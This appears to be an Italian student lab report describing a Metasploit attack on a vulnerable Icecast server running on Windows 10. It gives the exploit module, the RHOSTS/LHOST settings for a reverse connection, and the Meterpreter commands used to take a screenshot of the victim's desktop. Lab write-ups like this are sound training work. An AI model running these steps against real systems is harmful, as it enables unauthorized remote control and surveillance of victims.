1. Preparazione dell'Ambiente
Sistema Attaccante: Kali Linux con Metasploit Framework installato.
Sistema Target: Windows 10 con Icecast vulnerabile installato. Icecast è un software server di streaming audio noto per avere alcune versioni vulnerabili.
Rete Locale: La macchina Kali Linux e Windows 10 sono nella stessa rete o raggiungibili per la connessione.

2. Selezione dell'Exploit
Per sfruttare la vulnerabilità, è stato scelto l'exploit exploit/windows/http/icecast_header presente in Metasploit, noto per sfruttare una vulnerabilità nelle versioni di Icecast affette da problemi di gestione dell'header HTTP.

Comando eseguito per selezionare l'exploit:use exploit/windows/http/icecast_header

3. Configurazione dei Parametri
Una volta selezionato l'exploit, sono stati configurati i parametri necessari:

RHOSTS: Indirizzo IP della macchina target, il sistema Windows 10 con Icecast vulnerabile.
LHOST: Indirizzo IP del sistema attaccante (Kali Linux), necessario per ricevere la connessione inversa.
LPORT: Porta da utilizzare per la connessione inversa.
Comandi utilizzati per la configurazione:

set RHOSTS <IP_target>
set LHOST <IP_attaccante>

4. Lancio dell'Exploit
Una volta configurati i parametri, l'exploit è stato eseguito:exploit

L'exploit ha avuto successo, stabilendo una sessione Meterpreter con il sistema Windows 10 compromesso.

6. Operazioni su Meterpreter
Visualizzazione dell'indirizzo IP del Target
Per visualizzare l'indirizzo IP del sistema compromesso, è stato eseguito il comando:ipconfig

Questo ha restituito la configurazione di rete, permettendo di identificare l'IP della macchina target.

Cattura di uno Screenshot
Per ottenere uno screenshot del desktop della vittima, è stato utilizzato il comando:screenshot

L'immagine catturata è stata salvata nella directory di lavoro di Metasploit sul sistema attaccante. Questo ha fornito una rappresentazione visiva del desktop del sistema Windows 10 compromesso al momento dell'attacco.

6. Conclusione dell'Attacco
Dopo aver completato le operazioni richieste, la sessione Meterpreter è stata chiusa con:exit
